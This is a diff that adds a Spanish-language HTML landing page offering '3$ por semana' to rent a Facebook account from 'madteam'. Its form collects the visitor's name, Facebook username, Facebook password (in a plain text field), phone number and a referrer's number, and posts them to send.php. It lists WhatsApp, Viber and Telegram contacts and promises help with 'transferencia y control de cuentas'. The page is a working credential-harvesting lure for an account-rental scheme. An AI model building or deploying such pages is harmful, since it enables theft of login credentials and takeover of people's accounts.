@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Renta de cuentas de FACEBOOK</title>
+  <link rel="shortcut icon" href="favicon.png" type="image/x-icon">
+
+  <link rel="preconnect" href="https://fonts.gstatic.com">
+  <link
+    href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap"
+    rel="stylesheet">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+
+  <style>
+    html {
+      font-size: 20.833333vw;
+      overflow-x: hidden;
+      background: #e5e5e5;
+    }
+
+    @media (min-width: 481px) {
+      html {
+        font-size: 100px;
+      }
+    }
+
+    body {
+      font-family: "Roboto", sans-serif;
+      max-width: 480px;
+      overflow-x: hidden;
+      -webkit-box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.25);
+      box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.25);
+      margin: 0 auto;
+      background: #ffffff;
+      border-radius: 20px;
+      margin: auto;
+    }
+
+    .main {
+      -webkit-box-sizing: border-box;
+      box-sizing: border-box;
+      font-size: 0.16rem;
+      padding: 0.25rem 0.27rem;
+    }
+
+    .title {
+      font-weight: bold;
+      font-size: 0.20rem;
+      margin: 0;
+    }
+
+    .subtitle {
+      font-weight: 300;
+      font-size: 0.13rem;
+      margin-top: 0.09rem;
+      color: #6a6a6a;
+      margin-bottom: 0.2rem;
+    }
+
+    .box_input {
+      margin-bottom: 0.2rem;
+    }
+
+    .title-input {
+      font-weight: 300;
+      font-size: 0.13rem;
+      color: #000000;
+    }
+
+    .title-input b {
+      color: #ff0000;
+    }
+
+    .title-subtitle {
+      color: #6a6a6a;
+      font-weight: 300;
+      font-size: 0.10rem;
+    }
+
+    input {
+      width: 100%;
+      -webkit-box-sizing: border-box;
+      box-sizing: border-box;
+      background: #ffffff;
+      border: none;
+      border: 0.01rem solid #dcdcdc;
+      border-radius: 5px;
+      outline: none;
+      font-size: 0.16rem;
+      font-weight: 300;
+      padding-left: 0.19rem;
+      height: 0.40rem;
+    }
+
+    input::-webkit-input-placeholder {
+      color: #b5b5b5;
+      font-size: 0.13rem;
+    }
+
+    input:-ms-input-placeholder {
+      color: #b5b5b5;
+      font-size: 0.13rem;
+    }
+
+    input::-ms-input-placeholder {
+      color: #b5b5b5;
+      font-size: 0.13rem;
+    }
+
+    input::placeholder {
+      color: #b5b5b5;
+      font-size: 0.13rem;
+    }
+
+    .btn {
+      background: #548fc7;
+      border-radius: 5px;
+      width: 1.7rem;
+      height: 0.40rem;
+      border: none;
+      font-weight: 500;
+      font-size: 0.16rem;
+      color: #ffffff;
+    }
+
+    .sweet-title {
+      font-size: 0.2rem;
+      text-align: center;
+      padding: 30px 10px;
+    }
+
+    .feedback__text {
+      font-weight: 300;
+    }
+
+    .feedback__text--accent {
+      font-weight: 400;
+    }
+    .feedback-messengers{
+      display: flex;
+      justify-content: space-around;
+      align-items: center;
+    }
+    .feedback-messengers__link{
+      width: 48px;
+      height: 48px;
+      display: block;
+      box-sizing: border-box;
+    }
+    .feedback-messengers__link>img{
+      width: 100%;
+      height: auto;
+      
+    }
+  </style>
+</head>
+
+<body>
+  <div class="main ">
+    <h1 class="title">3$ por semana para su cuenta de Facebook.</h1>
+    <p class="subtitle">Elija un mensajero que le resulte conveniente para dejar una solicitud de cooperación con
+      madteam.</p>
+    <form id="form" method="POST" action="send.php">
+      <div class="box_input">
+        <p class="title-input">Ingrese su nombre exactamente como en FACEBOOK<b>*</b></p>
+        <input type="text" name="name" required placeholder="Introduzca su nombre">
+      </div>
+      <div class="box_input">
+        <p class="title-input">Ingrese su nombre de usuario en FACEBOOK<b>*</b></p>
+        <input type="text" name="login" required placeholder="Ingrese su respuesta">
+      </div>
+      <div class="box_input">
+        <p class="title-input">Ingrese su contraseña de FACEBOOK<b>*</b></p>
+        <p class="title-subtitle">En esta etapa, lo necesitamos para verificar si su cuenta es adecuada para nosotros
+        </p>
+        <input type="text" name="password" required placeholder="Ingrese su respuesta">
+      </div>
+      <div class="box_input">
+        <p class="title-input">Ingrese su número telefónico<b>*</b></p>
+        <input type="text" name="phone" required placeholder="Ingrese números">
+      </div>
+      <div class="box_input">
+        <p class="title-input">Especifique su método de contacto preferido<b>*</b></p>
+        <p class="title-subtitle">Móvil / WhatsApp / Viber / Telegram</p>
+        <input type="text" name="contact" required placeholder="Ingrese su respuesta">
+      </div>
+      <div class="box_input">
+        <p class="title-input">Ingrese el número de teléfono de la persona que nos recomendó<b>*</b></p>
+        <input type="text" name="referral" required placeholder="Ingrese su respuesta">
+      </div>
+      <button class="btn" type="submit" value="Submit">Enviar</button>
+    </form>
+    <div class="feedback">
+      <p class="feedback__text">
+        <span class="feedback__text--accent">Nota</span>: Siempre nos mantenemos en contacto con nuestros propietarios y
+        brindamos apoyo en temas de transferencia y control de cuentas.
+        Puede contactar con nuestro soporte a través de cualquier mensajero.
+      </p>
+      <div class="feedback-messengers">
+        <a href="https://www.messenger.com/t/" class="feedback-messengers__link">
+          <img src="img/facebook-messenger.svg" alt="">
+        </a>
+        <a href="https://wa.me/79382965240" class="feedback-messengers__link">
+          <img src="img/whatsapp.svg" alt="">
+        </a>
+        <a href="viber://chat?number=%2B79382965240" class="feedback-messengers__link">
+          <img src="img/viber.svg" alt="">
+        </a>
+        <a href="https://telegram.me/latam_arenda" class="feedback-messengers__link">
+          <img src="img/telegram.svg" alt="">
+        </a>
+      </div>
+    </div>
+  </div>
+
+  <div class="sweet-text-hidden ">
+    <div class="sweet-title">Gracias por el envío, nos comunicaremos usted lo mas rápido posible.</div>
+  </div>
+
+</body>
+
+</html>
